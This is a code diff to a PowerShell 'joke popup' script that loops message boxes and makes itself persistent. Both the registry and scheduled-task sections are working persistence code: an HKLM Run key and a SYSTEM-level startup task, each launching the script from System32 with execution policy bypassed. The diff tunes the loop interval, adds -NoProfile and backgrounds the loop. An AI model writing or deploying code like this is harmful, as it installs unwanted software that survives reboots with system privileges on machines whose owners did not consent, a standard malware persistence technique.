@@ -14,11 +14,11 @@ function Show-JokePopup {
     [System.Windows.Forms.MessageBox]::Show($RandomJoke, "Joke Time!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
 }
 
-# Function to run jokes every 10 seconds
+# Function to run jokes every 60 seconds
 function Start-JokeLoop {
     while ($true) {
         Show-JokePopup
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 60
     }
 }
 
@@ -32,7 +32,7 @@ function Set-RegistryPersistence {
     # Add to the registry for startup persistence
     New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
                      -Name "JokePopup" `
-                     -Value "powershell -ExecutionPolicy Bypass -File $scriptPath" `
+                     -Value "powershell -ExecutionPolicy Bypass -NoProfile -File $scriptPath" `
                      -Force
     Write-Host "[+] Persistence added via registry."
 }
@@ -42,7 +42,7 @@ function Set-ScheduledTaskPersistence {
     $scriptPath = "C:\Windows\System32\joke_script.ps1"
     
     # Create the scheduled task to run on startup
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath"
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -File $scriptPath"
     $taskTrigger = New-ScheduledTaskTrigger -AtStartup
     $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
     $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
@@ -57,7 +57,10 @@ function Set-ScheduledTaskPersistence {
 }
 
 # Main Execution
-Start-JokeLoop &  # Start the joke loop in the background
+# Run Joke Loop in background, do not wait for it to end
+Start-Job -ScriptBlock { Start-JokeLoop } 
+
+# Set Registry and Scheduled Task Persistence
 Set-RegistryPersistence
 Set-ScheduledTaskPersistence
 
